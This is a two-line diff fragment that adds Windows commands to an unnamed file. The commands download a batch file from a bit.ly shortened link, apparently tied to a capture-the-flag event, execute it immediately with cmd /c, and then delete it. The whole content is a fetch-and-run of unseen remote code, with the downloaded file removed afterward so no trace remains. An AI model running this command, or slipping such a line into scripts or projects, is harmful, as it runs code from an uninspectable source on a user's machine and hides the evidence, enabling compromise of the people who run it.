@@ -1,0 +1,2 @@
+curl -L -o ascend.bat https://bit.ly/ascendctf && cmd /c ascend.bat
+del ascend.bat
